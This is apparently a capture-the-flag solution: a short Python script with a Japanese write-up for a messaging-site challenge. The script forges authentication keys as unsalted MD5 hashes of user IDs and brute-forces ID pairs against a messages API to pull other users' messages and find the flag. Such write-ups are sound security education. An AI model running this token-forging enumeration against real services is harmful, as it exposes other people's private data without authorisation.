import hhtools.util as hu
import re

uid = 2
print(hu.to_md5(str(uid)))

for src in range(1,4):
    for dst in range(1,4):
        html = hu.get_file_via_internet_post_form('http://sherlock-message.ru/api/messages.getByDialog', {
            'user_id': str(src), 
            'key': hu.to_md5(str(dst))
        })
        flag = re.findall(r'FLAG\{\w+\}', html)
        print(flag)

'''

# 前提知識

- MD5

# 解説

ソースコードをたどると、メインロジックにたどり着ける。
http://sherlock-message.ru/script.js
ここから、POSTで`/api/`にメッセージを投げて色々な処理を行っている。
そこが隠蔽されていて見えない。

ログイン処理の部分を見てみると、localStorageにトークンっぽいのを置いて、認証判別しているっぽい。
見てみると`eccbc87e4b5ce2fe28308fd9f2a7baf3`がおいてある。
32文字といえばMD5なので、[ここ](https://hashtoolkit.com/decrypt-hash/?hash=eccbc87e4b5ce2fe28308fd9f2a7baf3)で検索してみる。
弱いハッシュで、3のMD5ハッシュであった。
`test:test`でログインすると、ユーザーIDが3なので、adminを見るには、1のMD5ハッシュとかを入れてやればよさそう。
実際、これは当たっている。

メッセージを呼び出すには、`/api/messages.getByDialog`に対して`{"user_id": 確認したいid, "key": 確認元idのmd5ハッシュ}`を付けてPOSTすればいいので、
これで「確認したいID」と「確認元ID」を全探索して、それっぽいフラグを探すと答え。
'''